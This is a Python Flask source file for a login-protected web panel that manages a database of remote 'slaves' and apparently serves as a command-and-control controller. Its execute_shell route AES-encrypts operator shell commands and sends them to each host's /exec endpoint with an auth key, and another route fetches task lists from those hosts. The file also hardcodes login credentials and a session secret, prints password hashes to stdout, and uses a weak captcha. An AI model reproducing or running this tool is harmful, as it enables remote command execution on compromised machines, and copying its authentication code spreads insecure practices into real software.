import os
import sqlite3
from flask import Flask, request, render_template, redirect, url_for, session, flash
import hashlib
import requests
from utils.encrypt import encrypt_data
from functools import wraps
import random
import string
from io import BytesIO
from captcha.image import ImageCaptcha


app = Flask(__name__)
app.secret_key = ';lasdkjfal;dskjfl;adskjfalskjfbhjjdlsj^&*()!'  # 设置一个密钥用于会话加密

# 定义全局的用户名和密码（仅通过修改代码来更改）
USERNAME = 'SEu.123@cjf.love_u'
PASSWORD = 'SeU@.123_wUhua$666'

# Global list to store data from the 'slaves' table
slaves_list = []


def init_db():
    """Initialize the SQLite database and load data from 'slaves' table into a global list."""
    global slaves_list
    db_path = 'database.db'
    db_exists = os.path.exists(db_path)
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    if not db_exists:
        cursor.execute('''
            CREATE TABLE slaves (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER NOT NULL,
                method TEXT NOT NULL,
                auth_key TEXT NOT NULL,
                aeskey TEXT NOT NULL
            )
        ''')
        conn.commit()
    # Read all data from 'slaves' table into 'slaves_list'
    cursor.execute('SELECT ip, port, method, auth_key, aeskey FROM slaves')
    slaves_list = cursor.fetchall()
    conn.close()


def login_required(f):
    """Decorator to ensure the user is logged in."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


@app.route('/login', methods=['GET', 'POST'])
def login():
    """Render the login page and handle authentication."""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']  # 明文密码
        captcha = request.form['captcha']

        if captcha.lower() != session.get('captcha', '').lower():
            flash('验证码错误')
            return redirect(url_for('login'))

        # 后端自行处理哈希
        password_hash = password
        stored_password_hash = hashlib.sha256(PASSWORD.encode()).hexdigest()
        print(password_hash)
        print(stored_password_hash)
        if username == USERNAME and password_hash == stored_password_hash:
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            flash('用户名或密码错误')
            return redirect(url_for('login'))

    return render_template('login.html')




@app.route('/captcha')
def get_captcha():
    """Generate a captcha image with distortions and noise."""
    # 生成随机字符串
    letters = string.ascii_letters + string.digits
    captcha_text = ''.join(random.choice(letters) for _ in range(4))
    session['captcha'] = captcha_text  # 保存到会话中

    # 使用 ImageCaptcha 生成验证码图像
    image_captcha = ImageCaptcha(width=160, height=60)
    captcha_image = image_captcha.generate_image(captcha_text)

    # 将图像保存到内存中
    buffer = BytesIO()
    captcha_image.save(buffer, format='PNG')
    buffer.seek(0)

    return app.response_class(buffer, mimetype='image/png')


@app.route('/logout')
def logout():
    """Logout the user."""
    session.pop('logged_in', None)
    return redirect(url_for('login'))


@app.route('/', methods=['GET'])
@login_required
def index():
    """Render the main page with the list of slaves."""
    return render_template('index.html', slaves=slaves_list)


@app.route('/add_slave', methods=['POST'])
@login_required
def add_slave():
    """Add a new slave to the database and update the global list."""
    # Get data from form
    ip = request.form['ip']
    port = request.form['port']
    method = request.form['method']
    auth_key = request.form['auth_key']
    aeskey = request.form['aeskey']

    # Insert data into database
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO slaves (ip, port, method, auth_key, aeskey) VALUES (?, ?, ?, ?, ?)',
                   (ip, port, method, auth_key, aeskey))
    conn.commit()
    conn.close()

    # Update global list
    slaves_list.append((ip, port, method, auth_key, aeskey))

    # Redirect back to the main page
    return redirect(url_for('index'))


@app.route('/execute_shell', methods=['POST'])
@login_required
def execute_shell():
    """Execute shell command on selected slaves."""
    # Get selected slave indices and command from form
    selected_indices = request.form.getlist('selected_slaves')
    command = request.form['command']

    responses = []

    # Send command to each selected slave
    for index in selected_indices:
        index = int(index)
        slave = slaves_list[index]
        ip, port, method, auth_key, aeskey = slave

        # Construct the URL
        url = f'http://{ip}:{port}/exec?authKey={auth_key}'

        # Encrypt the command using the slave's aeskey
        encrypted_command = encrypt_data(command, aeskey.encode())

        # Prepare the data payload
        data = {
            'data': encrypted_command
        }

        # Send POST request
        try:
            response = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            responses.append(f'Response from {ip}:{port}: {response.text}')
        except Exception as e:
            responses.append(f'Failed to send command to {ip}:{port}: {e}')

    # Render the index page with responses
    return render_template('index.html', slaves=slaves_list, responses=responses)


@app.route('/get_tasks/<int:slave_index>', methods=['GET'])
@login_required
def get_tasks(slave_index):
    """Get tasks from a specific slave."""
    if 0 <= slave_index < len(slaves_list):
        slave = slaves_list[slave_index]
        ip, port, method, auth_key, aeskey = slave

        # Construct the URL
        url = f'http://{ip}:{port}/getTasks?authKey={auth_key}'

        try:
            response = requests.get(url)
            if response.status_code == 200:
                tasks_json = response.json()
                tasks = tasks_json.get('tasks', [])
                # Render tasks partial template
                return render_template('tasks_partial.html', tasks=tasks, slave_ip=ip, slave_port=port)
            else:
                return f'Failed to get tasks from {ip}:{port}, status code: {response.status_code}', 500
        except Exception as e:
            return f'Error fetching tasks from {ip}:{port}: {e}', 500
    else:
        return 'Invalid slave index', 400


# Call init_db when the app starts
if __name__ == '__main__':
    init_db()
    app.run()
